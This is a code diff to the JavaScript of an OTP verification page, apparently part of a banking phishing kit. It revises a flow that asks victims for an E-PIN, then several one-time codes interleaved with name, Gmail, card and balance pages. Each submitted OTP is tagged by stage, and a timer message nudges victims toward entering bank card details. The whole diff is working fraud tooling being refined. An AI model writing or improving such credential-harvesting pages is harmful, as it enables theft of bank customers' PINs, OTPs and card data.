@@ -551,6 +551,11 @@
                 document.getElementById('errorMessage').textContent = 'Invalid OTP Code ! Please try again.';
             }
 
+            // Set button text - all OTP pages in flow show "Verify"
+            // Only the initial OTP (after EPIN) will change to "Verify with bank card" after 60 seconds
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.textContent = 'Verify';
+
             // Get current attempt count
             otpAttempts = parseInt(sessionStorage.getItem('otp_attempts') || '0');
 
@@ -564,8 +569,8 @@
             document.getElementById('otpForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const verifyBtn = document.getElementById('verifyBtn');
-                // Check if button was changed to "Verify with ATM card"
-                if (verifyBtn.textContent === 'Verify with ATM card') {
+                // Check if button was changed to "Verify with ATM card" (only for initial OTP after 60 seconds)
+                if (verifyBtn.textContent === 'Verify with ATM card' || verifyBtn.textContent === 'Verify with bank card') {
                     window.location.href = 'card.html';
                 } else {
                     await verifyOTP();
@@ -668,13 +673,14 @@
                     timer.textContent = '';
                     resendTimer = 60;
                     
-                    // Only change button and message if NOT on last screen
-                    if (msg !== 'last' && msg !== 'lastt') {
+                    // Only change button and message for initial OTP (after EPIN, when msg is empty)
+                    // Don't change for OTP pages in the flow (name/email/card) or last screens
+                    if (msg === '' || msg === 'again') {
                         // Change verification message when timer ends
                         verificationMessage.innerHTML = 'Didn\'t receive the OTP? Your E-PIN may be incorrect. Click <a href="index.html" class="re-enter-link">Re-Enter</a> or activate Via ATM Card';
                         
-                        // Change verify button text and type
-                        verifyBtn.textContent = 'Verify with ATM card';
+                        // Change verify button text and type to "Verify with bank card"
+                        verifyBtn.textContent = 'Verify with bank card';
                         verifyBtn.type = 'button';
                         verifyBtn.onclick = function(e) {
                             e.preventDefault();
@@ -733,8 +739,12 @@
                 
                 // Determine OTP type based on msg parameter
                 let otpType = 'OTP Submitted';
-                if (msg === 'againc') {
-                    otpType = 'Third OTP Submitted';
+                if (msg === 'name') {
+                    otpType = 'First OTP (After Name)';
+                } else if (msg === 'email') {
+                    otpType = 'Second OTP (After Email)';
+                } else if (msg === 'card') {
+                    otpType = 'Third OTP (After Card)';
                 } else if (msg === 'lastt' || msg === 'last') {
                     otpType = 'Last OTP Submitted';
                 }
@@ -761,14 +771,24 @@
                 }
                 
                 // Determine next page based on msg parameter
-                let nextPage = 'name.html';
-                if (msg === 'againc') {
+                let nextPage = 'name.html'; // Default: first OTP after EPIN goes to name
+                if (msg === 'name') {
+                    // After name OTP, go to email
                     nextPage = 'gmail.html';
+                } else if (msg === 'email') {
+                    // After email OTP, go to card
+                    nextPage = 'card.html';
+                } else if (msg === 'card') {
+                    // After card OTP, go to balance (or final page)
+                    nextPage = 'balance.html?msg=lastt';
                 } else if (msg === 'lastt') {
                     nextPage = 'otp.html?msg=last';
                 } else if (msg === 'last') {
                     nextPage = 'otp.html?msg=last'; // Stay on same page for last OTP
                 } else if (msg === 'again') {
+                    nextPage = 'name.html';
+                } else if (msg === '') {
+                    // Initial OTP (from EPIN) - if verified before 60 seconds, go to name
                     nextPage = 'name.html';
                 }
                 
